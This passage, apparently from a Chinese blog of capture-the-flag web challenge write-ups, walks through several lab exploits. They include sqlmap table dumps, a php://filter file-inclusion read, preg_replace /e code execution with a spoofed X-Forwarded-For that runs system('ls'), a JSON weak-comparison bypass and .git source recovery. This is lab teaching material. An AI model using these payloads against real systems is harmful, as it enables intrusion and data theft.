class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u  <span class="string">"http://111.198.29.45:33931/findpwd.php"</span> <span class="attribute">--data</span>=<span class="string">"username=1"</span> -D cetc004 -T<span class="built_in"> user </span>-C <span class="string">"username,password"</span> --dump</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/09/QdHfUK.png" alt="QdHfUK.png"></p></li></ul><p>由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdHTvd.png" alt="QdHTvd.png"></p><ul><li>此时对username查询可得到两条结果；<br><img src="https://s2.ax1x.com/2019/12/09/QdHbDI.png" alt="QdHbDI.png"><br>第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；<h2 id="知识补充：-6"><a href="#知识补充：-6" class="headerlink" title="知识补充："></a>知识补充：</h2>如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\Python27\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；<br>关于sqlmap使用：<a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">https://blog.csdn.net/qq_33530840/article/details/82144515</a></li></ul><hr><h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><h2 id="题目描述：-12"><a href="#题目描述：-12" class="headerlink" title="题目描述："></a>题目描述：</h2><p>其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p><h2 id="实际操作：-10"><a href="#实际操作：-10" class="headerlink" title="实际操作："></a>实际操作：</h2><p>点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面：</p><p><img src="https://s2.ax1x.com/2019/12/09/Qdb8IK.png" alt="Qdb8IK.png"></p><p>除了index.php页面，没有其他有效信息，查看源码：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdbJPO.png" alt="QdbJPO.png"></p><p>可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞；<br> <img src="https://s2.ax1x.com/2019/12/09/QdjHKg.png" alt="QdjHKg.png"><br>**<br>本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:<br>主要涉及到的函数：include(),require()、include_once(),require_once()<br>magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等<br>典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;<br>参考文章：<a href="https://blog.csdn.net/qq_29419013/article/details/81202358" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81202358</a><br>**<br>尝试读取index.php的页面源码，通过php内置协议直接读取代码：<br>?page=php://filter/read=convert.base64-encode/resource=index.php<br><img src="https://s2.ax1x.com/2019/12/09/Qdjqbj.png" alt="Qdjqbj.png"><br>得到很长一串base64编码，解码得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"renderer"</span> content=<span class="string">"webkit"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge,chrome=1"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"layui/css/layui.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class="layui-nav"&gt;</span><br><span class="line">        &lt;li class="layui-nav-item layui-this"&gt;&lt;a href="?page=index"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;"&gt;</span><br><span class="line">        &lt;legend&gt;设备列表&lt;/legend&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">    &lt;table class="layui-hide" id="test"&gt;&lt;/table&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/html"</span> id=<span class="string">"switchTpl"</span>&gt;</span><br><span class="line">        &lt;!-- 这里的 checked 的状态只是演示 --&gt;</span><br><span class="line">        &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"sex"</span> value=<span class="string">"&#123;&#123;d.id&#125;&#125;"</span> lay-skin=<span class="string">"switch"</span> lay-text=<span class="string">"开|关"</span> lay-filter=<span class="string">"checkDemo"</span> &#123;&#123; d.id==<span class="number">1</span> <span class="number">0003</span> ? <span class="string">'checked'</span> : <span class="string">''</span> &#125;&#125;&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"layui/layui.js"</span> charset=<span class="string">"utf-8"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.<span class="keyword">use</span>(<span class="string">'table'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> table = layui.table,</span><br><span class="line">            form = layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: <span class="string">'#test'</span>,</span><br><span class="line">            url: <span class="string">'/somrthing.json'</span>,</span><br><span class="line">            cellMinWidth: <span class="number">80</span>,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: <span class="string">'numbers'</span> &#125;,</span><br><span class="line">                     &#123; type: <span class="string">'checkbox'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'id'</span>, title: <span class="string">'ID'</span>, width: <span class="number">100</span>, unresize: <span class="keyword">true</span>, sort: <span class="keyword">true</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'name'</span>, title: <span class="string">'设备名'</span>, templet: <span class="string">'#nameTpl'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'area'</span>, title: <span class="string">'区域'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'status'</span>, title: <span class="string">'维护状态'</span>, minWidth: <span class="number">120</span>, sort: <span class="keyword">true</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'check'</span>, title: <span class="string">'设备开关'</span>, width: <span class="number">85</span>, templet: <span class="string">'#switchTpl'</span>, unresize: <span class="keyword">true</span> &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: <span class="keyword">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.<span class="keyword">use</span>(<span class="string">'element'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> element = layui.element; <span class="comment">//导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="line">        <span class="comment">//监听导航点击</span></span><br><span class="line">        element.on(<span class="string">'nav(demo)'</span>, <span class="function"><span class="keyword">function</span><span class="params">(elem)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//console.log(elem)</span></span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">        &lt;p class="lead"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">            &lt;p class="lead"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'input'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'ta:text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($page === <span class="string">'index.php'</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Ok'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>($page);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><hr><p>源码审计，得到如下可能存在问题的关键部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；<br>**<br>关于preg_replace：<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a><br>**<br>先来测试一下，看能不能输出关于PHP配置的信息；</p><ul><li>构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww<br>同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’；</li></ul><p><img src="https://s2.ax1x.com/2019/12/09/QdjbrQ.png" alt="QdjbrQ.png"></p><ul><li>构造：<br><img src="https://s2.ax1x.com/2019/12/09/Qdb3a6.png" alt="Qdb3a6.png"><br>验证成功！</li></ul><p>接下来尝试读取文件目录，利用system（）函数；</p><ul><li>构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww</li></ul><p><img src="https://s2.ax1x.com/2019/12/09/Qdb1Vx.png" alt="Qdb1Vx.png"><br>cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”):</p><p>**<br>%20url解释为空格、%26为&amp;<br>**<br> <img src="https://s2.ax1x.com/2019/12/09/QdbMrR.png" alt="QdbMrR.png"></p><p>得到flag文件，cd查看flag文件：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdbQq1.png" alt="QdbQq1.png"></p><p>得到flag.php，使用cat查看内容：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdbKM9.png" alt="QdbKM9.png"></p><hr><h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><h2 id="题目描述：-13"><a href="#题目描述：-13" class="headerlink" title="题目描述："></a>题目描述：</h2><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p><h2 id="实际操作：-11"><a href="#实际操作：-11" class="headerlink" title="实际操作："></a>实际操作：</h2><p><img src="https://s2.ax1x.com/2019/12/09/QwniUx.png" alt="QwniUx.png"></p><p>进入页面只有报表中心可以点击，有一个输入框，各种fuzzing，没成功，后来才知道直接爆破就行。。。</p><p><img src="https://s2.ax1x.com/2019/12/09/QwnF56.png" alt="QwnF56.png"></p><h2 id="知识点补充："><a href="#知识点补充：" class="headerlink" title="知识点补充："></a>知识点补充：</h2><p>关于<a href="http://single-minded_t.coding.me/2019/09/05/攻防世界之Web新手（7-12）/" target="_blank" rel="noopener">爆破</a></p><hr><h1 id="Lottery！"><a href="#Lottery！" class="headerlink" title="Lottery！"></a>Lottery！</h1><h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p>随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；<br><img src="https://s2.ax1x.com/2019/12/09/Qdvyiq.png" alt="Qdvyiq.png"><br>根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实，<br><img src="https://s2.ax1x.com/2019/12/09/Qdv6J0.png" alt="Qdv6J0.png"></p><h2 id="实际操作-3"><a href="#实际操作-3" class="headerlink" title="实际操作:"></a>实际操作:</h2><p>用burpsuite对输入彩票数字验证过程抓包，得到api.php;</p><p><img src="https://s2.ax1x.com/2019/12/09/QdvcWV.png" alt="QdvcWV.png"></p><p>  不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><ul><li>尝试访问：</li></ul><p><img src="https://s2.ax1x.com/2019/12/09/Qdx5jS.png" alt="Qdx5jS.png"></p><p>  可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)<br>打开之前下载好的源文件：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdvgzT.png" alt="QdvgzT.png"></p><p>打开api.php文件，可以看到以下验证彩票数字代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">    $same_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">            $same_count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ($same_count) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $prize = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            $prize = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            $prize = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            $prize = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            $prize = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            $prize = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $prize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；<br>改包：<br><img src="https://s2.ax1x.com/2019/12/09/QdvRQU.png" alt="QdvRQU.png"></p><p>发现已经获得$200000;多提交几余额就够了，buy-&gt;flag；</p><hr><h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><h2 id="题目分析：-1"><a href="#题目分析：-1" class="headerlink" title="题目分析："></a>题目分析：</h2><p>打开链接，出现如下页面：<br><img src="https://s2.ax1x.com/2019/12/09/QwnQat.png" alt="QwnQat.png"><br>[N1]:(<a href="https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG" target="_blank" rel="noopener">https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG</a>)</p><h2 id="实际操作：-12"><a href="#实际操作：-12" class="headerlink" title="实际操作："></a>实际操作：</h2><ul><li>尝试是否为sql注入：<br>抓包：<br><img src="https://s2.ax1x.com/2019/12/09/QwnMVI.png" alt="QwnMVI.png"></li></ul><ul><li><p>利用sqlmap,命令：<a href="http://sqlmap.py/" target="_blank" rel="noopener">sqlmap.py</a> -r 1.txt –dbs<br><img src="https://s2.ax1x.com/2019/12/30/lMcoi8.png" alt="newcenter0lMcoi8.png"></p></li><li><p>看到有一个news，命令：<a href="http://sqlmap.py/" target="_blank" rel="noopener">sqlmap.py</a> -r 1.txt -D news –dump</p></li></ul><p><img src="https://s2.ax1x.com/2019/12/30/lMcTJS.png" alt="newcenter1lMcTJS.png"><br>得到flag！</p><hr><h1 id="Mfw"><a href="#Mfw" class="headerlink" title="Mfw"></a>Mfw</h1><h2 id="题目分析：-2"><a href="#题目分析：-2" class="headerlink" title="题目分析："></a>题目分析：</h2><p>打开链接，几个目录都看了下，发现：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdvaQS.png" alt="QdvaQS.png"></p><p>可能存在git源码泄露，尝试访问.git目录：</p><p><img src="https://s2.ax1x.com/2019/12/09/Qdvron.png" alt="Qdvron.png"></p><h2 id="实际操作：-13"><a href="#实际操作：-13" class="headerlink" title="实际操作："></a>实际操作：</h2><p>利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdvwLQ.png" alt="QdvwLQ.png"></p><p>在GitHack目录下可以看到网站源码文件夹：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdvNz8.png" alt="QdvNz8.png"></p><p>在flag.php中只有如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// $FLAG = '';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是将flag.php中的内容注释了，不显在网页上。</p><ul><li>在index.php中发现关键代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**<br>assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false;</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*<span class="type">PHP</span>官方文档是怎么解释的：</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> — 检查一个断言是否为 <span class="type">FALSE</span></span><br><span class="line">    <span class="type">PHP</span> <span class="number">5</span></span><br><span class="line">    <span class="built_in">bool</span> <span class="keyword">assert</span> ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br><span class="line">    <span class="type">PHP</span> <span class="number">7</span></span><br><span class="line">    <span class="built_in">bool</span> <span class="keyword">assert</span> ( mixed $assertion [, <span class="type">Throwable</span> $<span class="keyword">exception</span> ] )</span><br><span class="line">    <span class="keyword">assert</span><span class="literal">()</span> 会检查指定的 assertion 并在结果为 <span class="type">FALSE</span> 时采取适当的行动。</span><br><span class="line">    如果 assertion 是字符串，它将会被 <span class="keyword">assert</span><span class="literal">()</span> 当做 <span class="type">PHP</span> 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options<span class="literal">()</span> 处理函数时，条件会转换为字符串，而布尔值 <span 